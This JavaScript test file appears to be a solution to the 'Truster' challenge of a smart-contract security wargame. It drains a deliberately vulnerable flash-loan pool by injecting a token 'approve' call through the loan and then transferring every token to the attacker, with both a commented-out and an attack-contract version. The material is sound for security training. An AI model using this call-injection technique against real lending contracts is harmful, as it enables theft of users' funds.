const { ether } = require("@openzeppelin/test-helpers");
const { accounts, contract, web3 } = require("@openzeppelin/test-environment");

const DamnValuableToken = contract.fromArtifact("DamnValuableToken");
const TrusterLenderPool = contract.fromArtifact("TrusterLenderPool");
const TrusterAttacker = contract.fromArtifact("TrusterAttacker");

const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  const [deployer, attacker, ...otherAccounts] = accounts;

  const TOKENS_IN_POOL = ether("1000000");

  before(async function () {
    /** SETUP SCENARIO */
    this.token = await DamnValuableToken.new({ from: deployer });
    this.pool = await TrusterLenderPool.new(this.token.address, {
      from: deployer,
    });

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL, {
      from: deployer,
    });

    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(
      TOKENS_IN_POOL
    );

    expect(await this.token.balanceOf(attacker)).to.be.bignumber.equal("0");
  });

  it("Exploit", async function () {
    // attack without needing a contract
    // const approvePayload = web3.eth.abi.encodeFunctionCall(
    //   {
    //     name: "approve",
    //     type: "function",
    //     inputs: [
    //       {
    //         type: "address",
    //         name: "spender",
    //       },
    //       {
    //         type: "uint256",
    //         name: "amount",
    //       },
    //     ],
    //   },
    //   [attacker, TOKENS_IN_POOL.toString()]
    // );
    // this.pool.flashLoan(0, attacker, this.token.address, approvePayload);
    // await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, {
    //   from: attacker,
    // });

    // single tx
    this.attacker = await TrusterAttacker.new({ from: attacker });
    await this.attacker.attack(this.token.address, this.pool.address, attacker);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.token.balanceOf(attacker)).to.be.bignumber.equal(
      TOKENS_IN_POOL
    );
    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(
      "0"
    );
  });
});
